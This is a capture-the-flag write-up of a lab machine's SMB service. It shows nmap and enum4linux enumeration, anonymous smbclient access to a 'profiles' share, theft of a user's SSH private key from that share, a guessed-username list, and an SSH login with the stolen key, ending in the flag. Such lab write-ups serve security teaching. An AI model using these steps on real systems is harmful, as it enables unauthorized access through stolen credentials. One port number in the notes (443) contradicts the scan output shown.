# Server Message Block

- [Overview](#overview)
- [Enumeration](#Enumeration)
  - [Steps For Enumeration](#steps-for-enumeration)
    - [NMAP](#nmap)
    - [Enum4Linux](#enum4linux)
- [Exploitation](#exploitation)
  - [SMB Client](#smbclinet)
  - [CLI](#cli)
  - [Pwnage](#Pwnage)
  - [Flag](#flag)

## Overview

- A client-server communication protocol used for sharing access to files, printers, serial ports and other network resources.
- Known as a response-request protocol.
  - Transmits multiple messages between the client and server to establish a connection.
- Clients connect over NetBIOS TCP/IP

### Enumeration

- The process of gathering info on a target to find potential attack.
  - Usernames, passwords, network info, hostnames, app data, services, etc.
- There are typically SMB share drives on a server that can be connected to for use of transferring files.
- Can also be a great starting point for discovering sensitive data.

#### Steps for enumeration

##### Nmap

1.  CLI

- Input:

  ```bash
  sudo nmap -p- -A -sV -vv -oA nmap/ 10.10.157.118
  ```

- Output:

  ```bash
  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA)
  |   256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA)
  |_  256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519)
  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
  Host script results:
  |_clock-skew: mean: 0s, deviation: 1s, median: -1s
  |\_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb-os-discovery:
  | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
  | Computer name: polosmb
  | NetBIOS computer name: POLOSMB\x00
  | Domain name: \x00
  | FQDN: polosmb
  |_ System time: 2021-04-27T01:41:41+00:00
  | smb-security-mode:
  | account*used: guest
  | authentication_level: user
  | challenge_response: supported
  |* message*signing: disabled (dangerous, but default)
  | smb2-security-mode:
  | 2.02:
  |* Message signing enabled but not required
  | smb2-time:
  | date: 2021-04-27T01:41:40
  |\_ start_date: N/A
  ```

  - There are 3 open ports
    - **22**: ssh
    - **139/443** : smb
  - OS Detected
    - **OS: Windows 6.1**

##### Enum4Linux

Enumerate SMB shares on both win and Linux systems

- **Usage:** enum4linux [options] ip

| TAG  | FUNCTION                                    |
| ---- | ------------------------------------------- |
| -U   | get userlist                                |
| -M   | get machine list                            |
| -N   | get namelist dump (different from -U and-M) |
| -S   | get sharelist                               |
| -P   | get password policy information             |
| -G   | get group and member list                   |
| -A   | all of the above (full basic enumeration)   |

1. CLI
   Input

   ```bash
   $ enum4linux -A 10.10.157.118
   ```

   Output: Notice, the shares that are listed

   ```bash
   [+] Attempting to map shares on 10.10.157.118
   //10.10.157.118/netlogon        [E] Can't understand response:
   tree connect failed: NT_STATUS_BAD_NETWORK_NAME
   //10.10.157.118/profiles        Mapping: OK, Listing: OK
   //10.10.157.118/print$  Mapping: DENIED, Listing: N/A
   //10.10.157.118/IPC$    [E] Can't understand response:
   NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
   ```

   - **/profiles** is an available share

   The name of the workgroup here is simply WORKGROUP

   ```bash
   [+] Got domain/workgroup name: WORKGROUP
   ```

   OS information can be gathered

   ```bash
   =======================================
   |    OS information on 10.10.157.118    |
   =======================================
   [+] Got OS info for 10.10.157.118 from smbclient:
   [+] Got OS info for 10.10.157.118 from srvinfo:
         POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
         platform_id     :       500
         os version      :       6.1
         server type     :       0x809a03
   ```

   - **Name**: POLOSMB
   - **OS Version:** 6.1

### Exploitation

Although there are CVE's available that will allow one to gain RCE, we are more likely to encounter a situation where there's a misconfiguration on the system.

With this machine, we will be exploiting anonymous SMB share access. A common misconfiguration that can allow us to gain info that will lead to a shell.

Since we are trying to access an SMB share, we need a client to access resources on servers.

##### SMBClinet

We will use this too because it's part of the default samba suite.

- **Usage:** smbclient //IP/SHARE
  -U [name] : to specify the user
  -p [port] : to specify the port

##### CLI

- Input:

  ```bash
  $ smbclient //10.10.157.118/profiles
  ```

- Output:
  As a result, we were able to **log in anonymously** and navigate through the profiles share. Using the ls command, we can see a users **/home directory**.

- Findings:
  - **Work From Home.txt**: A txt file with a message from IT containing **work from home information** and the **users First and Last name, John Cactus**.
  - **.ssh/id_rsa**: Copied to my local machine. Chmod to 600.

##### Pwnage

- Created a wordlist for the users potential ssh login

```txt
- jc
- johncactus
- john.cactus jc
- jcactus
- j.cactus
- john
- cactus
```

- Command

```bash
ssh -i id_rsa cactus@10.10.157.118
```

##### Flag

```bash
THM{smb_is_fun_eh?}
```
